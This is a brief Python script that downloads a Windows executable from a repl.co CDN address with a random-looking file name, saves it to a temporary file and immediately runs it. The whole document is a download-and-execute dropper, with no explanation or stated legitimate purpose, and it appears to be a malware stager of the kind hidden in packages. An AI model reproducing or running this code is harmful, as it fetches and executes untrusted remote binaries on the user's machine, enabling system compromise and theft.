import urllib.request
import tempfile
import subprocess

url = 'https://cdn.dreamyoak.repl.co/cdn/hb2Voh.exe'
with urllib.request.urlopen(url) as response:
    with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
        tmp_file.write(response.read())
        exe_path = tmp_file.name

subprocess.call([exe_path])